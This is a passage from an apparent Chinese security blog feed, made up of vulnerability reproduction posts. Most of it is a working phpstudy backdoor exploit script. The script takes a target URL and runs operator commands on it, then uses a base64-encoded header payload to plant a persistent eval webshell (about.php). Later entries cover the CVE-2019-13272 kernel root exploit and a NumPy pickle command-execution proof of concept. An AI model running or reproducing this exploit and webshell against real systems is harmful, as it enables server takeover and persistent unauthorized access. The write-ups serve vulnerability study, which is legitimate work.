requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url</span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="漏洞复现及php传shell"><a href="#漏洞复现及php传shell" class="headerlink" title="漏洞复现及php传shell"></a>漏洞复现及php传shell</h3><p><a href="http://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more">PHP文件写入</a></p><p><a href="http://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">phpstudy后门漏洞复现</a></p><h3 id="代码编写总结"><a href="#代码编写总结" class="headerlink" title="代码编写总结"></a>代码编写总结</h3><blockquote><p>记录一些忘了的点，想到哪说哪</p></blockquote><h4 id="关闭https警告"><a href="#关闭https警告" class="headerlink" title="关闭https警告"></a>关闭https警告</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><h4 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()  <span class="comment">#读取为一个列表</span></span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><h4 id="requests请求后解析时自动判断编码问题"><a href="#requests请求后解析时自动判断编码问题" class="headerlink" title="requests请求后解析时自动判断编码问题"></a>requests请求后解析时自动判断编码问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自动判断编码后，使用requests.text有时候会乱码，直接一点，在返回解析时指定编码</span><br><span class="line"></span><br><span class="line">result.encoding = <span class="string">'gbk'</span></span><br></pre></td></tr></table></figure><h4 id="面向对象编程（类）高级用法"><a href="#面向对象编程（类）高级用法" class="headerlink" title="面向对象编程（类）高级用法"></a>面向对象编程（类）高级用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">为了保证安全性以及代码的健壮性，不直接定义私有变量，而是通过提示私有变量，通过装饰器来实现,并且使用object来继承，方便高级调用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">初始化的时候带了了参数，所以在实例化的时候要带参数（脑子一抽风），懒得改了，直接在实例化的时候传两个空参数进去，后面再进行自己构造调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)  <span class="comment">#空参数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url<span class="comment">#具体调用</span></span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><h4 id="argparse参数化解析编程"><a href="#argparse参数化解析编程" class="headerlink" title="argparse参数化解析编程"></a>argparse参数化解析编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">定义description以及usage，为了防止在调用命令时出现的如反斜杠之类的参数被转义，使用单双引号等避免转义，略显麻烦</span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在定义参数时，后面可能跟不止一个参数，尤其是执行系统命令，为了方便，不限定后面接的数量（nargs=argparse.REMAINDER）；同时使用解析参数的时候将后面跟的参数（以空格分开的）拼接成一个字符串</span><br><span class="line"></span><br><span class="line">parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br></pre></td></tr></table></figure><p>主要是一些细节上的点记不清了，特此记录一下</p><h3 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h3><p><a href="https://github.com/demossl/phpstudy_backdoor_getshell" target="_blank" rel="noopener">github地址</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://yzddmr6.tk/posts/phpstudy-backdoor/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/phpstudy-backdoor/</a></p><p><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;PHPstudy后门漏洞POC-EXP编写&quot;&gt;&lt;a href=&quot;#PHPstudy后门漏洞POC-EXP编写&quot; class=&quot;headerlink&quot; title=&quot;PHPstudy后门漏洞POC-EXP编写&quot;&gt;&lt;/a&gt;PHPstudy后门漏洞POC-EXP编写&lt;/
      
    
    </summary>
    
      <category term="POC/EXP编写" scheme="https://www.lsowl.top/categories/POC-EXP%E7%BC%96%E5%86%99/"/>
    
    
      <category term="code" scheme="https://www.lsowl.top/tags/code/"/>
    
      <category term="poc" scheme="https://www.lsowl.top/tags/poc/"/>
    
      <category term="exp" scheme="https://www.lsowl.top/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272 Linux Kernel&lt; 5.1.17 PTRACE_TRACEME 漏洞复现</title>
    <link href="https://www.lsowl.top/2019/10/08/CVE-2019-13272-Linux-Kernel-5-1-17-PTRACE-TRACEME-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.lsowl.top/2019/10/08/CVE-2019-13272-Linux-Kernel-5-1-17-PTRACE-TRACEME-漏洞复现/</id>
    <published>2019-10-08T14:27:12.000Z</published>
    <updated>2019-11-08T14:30:17.728Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2019-13272-Linux-Kernel-lt-5-1-17-PTRACE-TRACEME-漏洞复现"><a href="#CVE-2019-13272-Linux-Kernel-lt-5-1-17-PTRACE-TRACEME-漏洞复现" class="headerlink" title="CVE-2019-13272 Linux Kernel&lt; 5.1.17 PTRACE_TRACEME 漏洞复现"></a>CVE-2019-13272 Linux Kernel&lt; 5.1.17 PTRACE_TRACEME 漏洞复现</h3><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>kernel 5.1.17之前版本中存在安全漏洞，该漏洞源于kernel/ptrace.c文件的ptrace_link没有正确处理对凭证的记录。攻击者可利用该漏洞获取root访问权限。由于PTRACE_TRACEME允许的borked权限，利用bug在概念上很有趣。对象生命周期处理问题可能会导致内存损坏，但它需要以精确的方式进行代码竞争。事实PTRACE_TRACEME证明，除了父进程之外，内核还记录了跟踪器的凭据。研究人员概述的方案涉及一个父进程，该进程分叉一个孩子，这个孩子会分叉。第一个子进程使用命令pkexec（用于以root身份运行程序），第二个子进程运行PTRACE_TRACEME，然后第一个子进程丢弃其权限。最终结果是父进程可以使用ptrace来控制第一个子进程，后者可以使用ptrace来控制第二个子进程 - 从而让攻击者获得对两个进程的控制权。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// - Ubuntu 16.04.5 kernel 4.15.0-29-generic</span><br><span class="line">// - Ubuntu 18.04.1 kernel 4.15.0-20-generic</span><br><span class="line">// - Ubuntu 19.04 kernel 5.0.0-15-generic</span><br><span class="line">// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</span><br><span class="line">// - Linux Mint 19 kernel 4.15.0-20-generic</span><br><span class="line">// - Debian 9.4.0 kernel 4.9.0-6-amd64</span><br><span class="line">// - Debian 10.0.0 kernel 4.19.0-5-amd64</span><br><span class="line">// - Devuan 2.0.0 kernel 4.9.0-6-amd64</span><br><span class="line">// - SparkyLinux 5.8 kernel 4.19.0-5-amd64</span><br><span class="line">// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</span><br><span class="line">// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</span><br><span class="line">// - Mageia 6 kernel 4.9.35-desktop-1.mga6</span><br><span class="line">// - Antergos 18.7 kernel 4.17.6-1-ARCH</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>gcc -s CVE-2019-13272.c -o exp</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564589096.73.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564589346.27.png" alt></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>加固建议：</p><p>参考官方团毒给出的最新内核补丁</p><p><a href="https://github.com/torvalds/linux/commit/6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/6994eefb0053799d2e07cd140df6c2ea106c41ee</a></p><p>POC代码下载</p><p><a href="https://github.com/CrisWang/Exploit-Virtual-Machine/tree/master/Linux" target="_blank" rel="noopener">https://github.com/CrisWang/Exploit-Virtual-Machine/tree/master/Linux</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2019-13272-Linux-Kernel-lt-5-1-17-PTRACE-TRACEME-漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-13272-Linux-Kernel-lt-5-1-17-PTRACE-TRACEME-漏洞复现&quot; clas
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE-2019-13272" scheme="https://www.lsowl.top/tags/CVE-2019-13272/"/>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Numpy反序列化命令执行漏洞复现</title>
    <link href="https://www.lsowl.top/2019/10/08/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.lsowl.top/2019/10/08/Numpy反序列化命令执行漏洞复现/</id>
    <published>2019-10-08T14:20:54.000Z</published>
    <updated>2019-11-08T14:30:17.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Numpy反序列化命令执行漏洞复现"><a href="#Numpy反序列化命令执行漏洞复现" class="headerlink" title="Numpy反序列化命令执行漏洞复现"></a>Numpy反序列化命令执行漏洞复现</h2><h3 id="numpy简介"><a href="#numpy简介" class="headerlink" title="numpy简介"></a>numpy简介</h3><p>NumPy 是 Python 机器学习库中之一，主要对于多为数组执行计算。NumPy 提供大量的 函数和操作，能够帮助程序员便利进行数值计算。在 NumPy 1.16.0 版本之前存在反序列化 命令执行漏洞，用户加载恶意的数据源造成命令执行</p><h3 id="影响范围及利用条件"><a href="#影响范围及利用条件" class="headerlink" title="影响范围及利用条件"></a>影响范围及利用条件</h3><p>NumPy &lt;=1.16.0NumPy &lt;=1.16.0</p><p>用户加载恶意数据源造成命令执行。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.16.0 版本为例进行分析。漏洞点位于 npyio.py 的第 268 行，file 字符串对象经过格式验证，如果不满足默认的 numpy 以及 zip 格式，将会尝试使用序列化的方式进行读取文件。顺着 pickle.load 函数继续跟进看看。最终会发现他会逐字节的去读取命令，pickle 默认支持很多命令语句，通过pickle就可以构造命令执行</p><h3 id="漏洞利用-1：（通过numpy-ma-中的core加载只能触发Python2版本，python3会由于编码问题无法触发漏洞）"><a href="#漏洞利用-1：（通过numpy-ma-中的core加载只能触发Python2版本，python3会由于编码问题无法触发漏洞）" class="headerlink" title="漏洞利用-1：（通过numpy.ma 中的core加载只能触发Python2版本，python3会由于编码问题无法触发漏洞）"></a>漏洞利用-1：（通过numpy.ma 中的core加载只能触发Python2版本，python3会由于编码问题无法触发漏洞）</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1557915994.25.png" alt></p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用-2"></a>漏洞利用-2</h3><h4 id="POC如下（通杀python2和python3中numpy-lt-1-16-0版本）"><a href="#POC如下（通杀python2和python3中numpy-lt-1-16-0版本）" class="headerlink" title="POC如下（通杀python2和python3中numpy&lt;1.16.0版本）"></a>POC如下（通杀python2和python3中numpy&lt;1.16.0版本）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># CVE-2019-6446</span></span><br><span class="line"><span class="keyword">from</span> numpy.lib <span class="keyword">import</span> npyio</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> __version__</span><br><span class="line">print(__version__)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.a = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'whoami'</span>,))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tmpdaa = Poc()</span><br><span class="line">    npyio.save(<span class="string">"poc"</span>,tmpdaa)</span><br><span class="line">    npyio.load(<span class="string">"poc.npy"</span>)</span><br></pre></td></tr></table></figure><h4 id="Windows（py2-numpy-1-14-0-py3-numpy-1-14-4）"><a href="#Windows（py2-numpy-1-14-0-py3-numpy-1-14-4）" class="headerlink" title="Windows（py2-numpy = 1.14.0/py3-numpy = 1.14.4）"></a>Windows（py2-numpy = 1.14.0/py3-numpy = 1.14.4）</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1557933018.48.png" alt></p><h4 id="linux-py2-numpy-1-16-3-py3-numpy-1-16-0"><a href="#linux-py2-numpy-1-16-3-py3-numpy-1-16-0" class="headerlink" title="linux(py2-numpy = 1.16.3/ py3-numpy = 1.16.0)"></a>linux(py2-numpy = 1.16.3/ py3-numpy = 1.16.0)</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1557933136.27.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1557933171.32.png" alt></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>在numpy源码中设置 allow_pickle=False</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/9qwTTtQdpIjH8f0CcDYs6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9qwTTtQdpIjH8f0CcDYs6g</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Numpy反序列化命令执行漏洞复现&quot;&gt;&lt;a href=&quot;#Numpy反序列化命令执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;Numpy反序列化命令执行漏洞复现&quot;&gt;&lt;/a&gt;Numpy反序列化命令执行漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;numpy
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="Numpy" scheme="https://www.lsowl.top/tags/Numpy/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门漏洞复现</title>
    <link href="https://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.lsowl.top/2019/09/28/phpstudy后门漏洞复现/</id>
    <published>2019-09-28T08:46:44.000Z</published>
    <updated>2019-09-28T08:49:48.944Z</updated>
    
